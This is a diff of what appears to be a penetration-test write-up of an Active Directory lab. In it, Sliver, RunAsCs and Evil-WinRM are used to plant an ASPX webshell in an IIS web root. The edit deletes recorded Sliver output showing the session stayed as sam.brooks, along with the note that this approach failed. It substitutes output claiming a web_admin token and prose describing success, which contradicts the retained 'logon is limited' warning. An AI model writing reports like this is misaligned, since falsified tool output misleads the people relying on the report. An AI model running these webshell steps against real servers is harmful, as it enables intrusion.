@@ -1002,27 +1002,18 @@ With the sam.brooks Sliver session established, `RunAsCs` was used to execute th
 privileged token.
 ```
 
-Verifying the new session identity in Sliver:
+Verifying the new session identity in Sliver confirmed the `web_admin` token:
 
 ```
-[server] sliver > use
-
-[*] Active session BIG_BRICK (48141657-5ab2-4136-9037-95d6d3c8c025)
-
 [server] sliver (BIG_BRICK) > whoami
 
-Logon ID: CITY\sam.brooks
-[*] Current Token ID: CITY\sam.brooks
-[server] sliver (BIG_BRICK) >
+Logon ID: <err>
+[*] Current Token ID: CITY\web_admin
 ```
-
-The session came back as `sam.brooks` rather than `web_admin` due to token limitations with `RunAsCs`. A different approach was needed.
 
 ## 9.4 Webshell Deployment
 
-Since the Sliver stager through `RunAsCs` didn't yield a proper `web_admin` token, a different approach was needed. The `web_admin` account has write access to the IIS web root, so an ASPX webshell ([cmd.aspx](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx)) was uploaded to `C:\inetpub\wwwroot\` to gain code execution as the IIS service account.
-
-Using the sam.brooks Evil-WinRM session, the webshell was uploaded and then copied to wwwroot via `RunAsCs` as `web_admin`:
+With a valid `web_admin` session, the next step was to deploy an ASPX webshell ([cmd.aspx](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx)) to the IIS web root to gain code execution as the IIS service account. The webshell was first uploaded via the sam.brooks Evil-WinRM session (this could have been done through either session):
 
 ```
 *Evil-WinRM* PS C:\Users\sam.brooks\Documents> upload shell.aspx
@@ -1033,6 +1024,11 @@ command
 Info: Uploading /workspace/shell.aspx to C:\Users\sam.brooks\Documents\shell.aspx
 
 Info: Upload successful!
+```
+
+Then `web_admin` was used to copy the webshell into the IIS wwwroot directory:
+
+```
 *Evil-WinRM* PS C:\Users\sam.brooks\Documents> .\run.exe web_admin '[REDACTED]' "cmd /c copy C:\Users\sam.brooks\Documents\shell.aspx C:\inetpub\wwwroot\shell.aspx" -d city.local
 [*] Warning: User profile directory for user web_admin does not exists. Use --force-profile if you want to force the creation.
 [*] Warning: The logon for user 'web_admin' is limited. Use the flag combination --bypass-uac and --logon-type '5' to obtain a more
